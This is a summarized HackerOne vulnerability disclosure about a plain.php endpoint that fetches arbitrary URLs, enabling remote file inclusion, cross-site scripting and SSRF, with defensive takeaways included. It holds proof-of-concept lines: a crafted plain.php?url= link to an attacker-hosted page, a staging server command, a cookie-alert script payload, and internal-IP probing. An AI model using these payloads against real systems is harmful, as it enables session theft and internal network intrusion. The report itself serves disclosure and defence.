# Remote File Inclusion, Malicious File Hosting, and Cross-site Scripting via plain.php

## Metadata
- **Source:** HackerOne
- **Report:** 192940 | https://hackerone.com/reports/192940
- **Submitted:** 2016-12-21
- **Reporter:** jutsuce
- **Program:** HackerOne (Undisclosed Target)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Remote File Inclusion (RFI), Cross-Site Scripting (XSS), Server-Side Request Forgery (SSRF), Unrestricted File Access
- **CVEs:** None
- **Category:** web-api

## Summary
The plain.php endpoint lacks input validation and whitelisting, allowing attackers to include arbitrary remote files and embed malicious JavaScript payloads via the 'url' parameter. This enables attackers to weaponize the vulnerable server as a malicious file hosting relay, perform SSRF attacks to scan internal networks, and execute XSS attacks against users accessing the application.

## Attack scenario
1. Attacker identifies plain.php endpoint accepting a 'url' parameter with no validation
2. Attacker sets up a malicious web server hosting XSS payloads in HTML files
3. Attacker crafts malicious URL: plain.php?url=http://attacker.com/malicious.html with various operation parameters
4. Vulnerable server fetches and renders attacker's malicious content, embedding it in the response
5. Victim visits the crafted URL and malicious JavaScript executes in their browser with victim's privileges
6. Attacker alternatively scans internal IPs/services via SSRF using plain.php as a proxy (e.g., url=http://192.168.1.x/)

## Root cause
The application implements file/directory fetching functionality without any whitelisting of allowed URLs, input validation, or access controls. The parameter 'url' is directly used to fetch remote content which is then rendered/processed server-side and sent to the client without sanitization.

## Attacker mindset
An opportunistic attacker exploits a misconfigured utility function as a proxy relay. They recognize that the lack of restrictions enables multi-vector attacks: gaining code execution via XSS, using the server to probe internal infrastructure via SSRF, and leveraging the trusted domain for phishing/malware distribution.

## Defensive takeaways
- Implement strict URL whitelisting - only permit fetching from pre-approved domains/paths
- Validate and sanitize all user inputs, especially URL parameters
- Implement authentication and authorization checks before allowing file inclusion operations
- Restrict the protocol to HTTP/HTTPS and validate domain ownership
- Use allow-lists for file types that can be processed
- Apply Content Security Policy (CSP) headers to prevent XSS execution
- Implement rate limiting on file inclusion endpoints to prevent SSRF scanning
- Log and monitor access to sensitive utility functions
- Disable PHP execution in directories accessible via file inclusion if possible
- Conduct code review specifically for RFI/LFI vulnerability patterns

## Variant hunting
Search for similar patterns: (1) Other endpoints accepting 'url' or 'file' parameters without validation, (2) Functions using file_get_contents(), curl_exec(), or include()/require() with user input, (3) Utility functions for 'proxying', 'fetching', or 'importing' content, (4) Parameters named 'operation', 'parameter', or similar that might indicate legacy/utility functions, (5) Endpoints returning raw or minimally sanitized remote content

## MITRE ATT&CK
- T1190
- T1598
- T1557
- T1105
- T1003
- T1526

## Notes
Report demonstrates responsible disclosure with technical validation steps. The vulnerability is particularly dangerous because it combines multiple attack vectors (RFI, XSS, SSRF) from a single misconfigured endpoint. The use of query parameters for sensitive operations without authentication suggests this may be a legacy utility endpoint exposed unintentionally. The remediation advice is sound but implementation should prioritize whitelisting over blacklisting.

## Full report
<details><summary>Expand</summary>

### Details:
There is currently a security misconfiguration on `plain.php` function located on the host `http://██████████/` allowing attackers to include webserver contents of their choosing (no restriction on filetypes and/or IP addresses), as well as embed malicious javascript payloads in the response via filenames. **This allows attackers to hijack the entire page as a malicious file hosting relay and/or leverage it for XSS attacks on users (authenticated or otherwise).** 

### Technical Explanation:
This vulnerability occurs because of the web application's functionality which is intended to pull directory contents from a specified location. **This functionality extends to importing the contents of those files, meaning that web-page formatted code and/or web page files (`.php`,`.html` etc.) saved on the attacker's server, will be rendered to the victim BY the `████████` server.** 

### Exploitation and Validation: 
**The above information means that attackers can do things like the following:**

--------
#[1]
1. Setup attacking server with malicious web page(s): `python -m SimpleHTTPServer 80`
2. Import the web-page directly into the █████ page: `http://███/████/proxys/plain.php?url=http://attacker_server/t.html&operation=GetParameterInfo&parameter=countryBoundaryLayer&outputFormat=JSON`.

███
█████
**Source & Contents of `t.html`:**
```
<h1>JUTSUCE RFI TEST</h1>
<script>alert(document.cookie)</script>
<script>alert('jutsuce')</script>
```
█████████

--------
#[2]
Additional Exploitation Vectors:
██████
███
████████
██████
--------
#[3]
**Due to the lack of whitelisting and/or site restrictions pseudo-Server-Side-Request-Forgery (SSRF) is a feasible attack vector, and would be easily automated:**
* Internal IP Address Scanning
* Internal Site &/or File Compromise

-------
### Remediation:
**Remove the ability for any external interaction within a functionality of this nature. If external interaction is absolutely required then alongside whitelisting (what hosts/files/etc. are valid), authenticative restrictions should be implemented in order to restrict accessibility.** Whether or not interaction is restricted to internalized site(s), the function should have whitelisting implemented to stop the [3] set of exploit vectors listed above.

Thank you!

`~Jutsuce`

</details>

---
*Analysed by Claude on 2026-05-24*
